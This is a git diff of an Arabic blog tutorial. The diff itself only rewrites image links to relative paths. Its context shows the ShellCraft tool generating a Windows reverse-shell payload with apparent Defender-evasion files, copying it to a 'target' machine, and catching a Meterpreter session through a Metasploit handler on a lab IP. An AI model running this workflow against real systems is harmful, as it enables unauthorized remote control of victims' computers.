@@ -10,14 +10,14 @@
 
 أولاً نقوم بنسخ رابط الأداة من المستودع: على GitHub.
 
-![clone](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0270.png)
+![clone](shell_img/IMG_0270.png)
 
 ثم نقوم بتحميلها إلى النظام باستخدام الأمر التالي:
 
 ```
 git clone https://github.com/HackScaleTeam/ShellCraft
 ```
- ![install](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0271.png)
+ ![install](shell_img/IMG_0271.png)
 
 
 # الدخول إلى مجلد الأداة
@@ -26,7 +26,7 @@ git clone https://github.com/HackScaleTeam/ShellCraft
 ```
 cd ShellCraft
 ```
-![cd](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0272.png)
+![cd](shell_img/IMG_0272.png)
 
 ولعرض الملفات الموجودة داخل المجلد نستخدم الأمر:
 ```
@@ -45,7 +45,7 @@ chmod +x install.sh
 ```
 sudo ./install.sh
 ```
-![chmod](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0273.png)
+![chmod](shell_img/IMG_0273.png)
 
 
 # إنشاء Payload باستخدام ShellCraft
@@ -58,7 +58,7 @@ python3 shellcraft.py --msf 172.16.166.130 4444 -o payload.exe
 
 الخيار -o يعني تحديد اسم ملف الإخراج، وفي هذا المثال اخترنا الاسم payload.exe، ويمكنك اختيار أي اسم تريده.
 
-![exam](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0276.png)
+![exam](shell_img/IMG_0276.png)
 
 
 # الملفات التي سيتم إنشاؤها
@@ -69,10 +69,10 @@ payload.exe
 payload.dll
 DefenderWrite.exe
 ```
-![3](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0277.png)
+![3](shell_img/IMG_0277.png)
 
 بعد ذلك نقوم بنقل هذه الملفات إلى نظام ويندوز المستهدف.
-![exm](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0278.png)
+![exm](shell_img/IMG_0278.png)
 
 
 
@@ -84,7 +84,7 @@ DefenderWrite.exe
 ```
 msfconsloe
 ```
-![msf](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0279.png)
+![msf](shell_img/IMG_0279.png)
 
  ومن ثم تشغيل الامر التالي :
 ```
@@ -103,7 +103,7 @@ set payload windows/meterpreter/reverse_tcp
 set LHOST 172.16.166.130
 set LPORT 4444
 ```
-![msd](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0280.png)
+![msd](shell_img/IMG_0280.png)
 
 ## تشغيل الـ Payload على النظام المستهدف
 
@@ -115,7 +115,7 @@ payload.exe
 
 ⚠️ تأكد من أن الملفات الثلاثة موجودة في نفس المجلد.
 
-![win](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0281.png)
+![win](shell_img/IMG_0281.png)
 
 
 # الحصول على Meterpreter Session
@@ -124,10 +124,10 @@ payload.exe
 
 كما نرى في الصورة التالية، تم الحصول على Reverse Connection بنجاح وفتح Meterpreter session.
 
-![r](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0282.png)
+![r](shell_img/IMG_0282.png)
 
 نشغل الامر sysinfo لمعرفة تفاصيل النظام :
-![e](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0283.png)
+![e](shell_img/IMG_0283.png)
 
 
 # الخاتمة
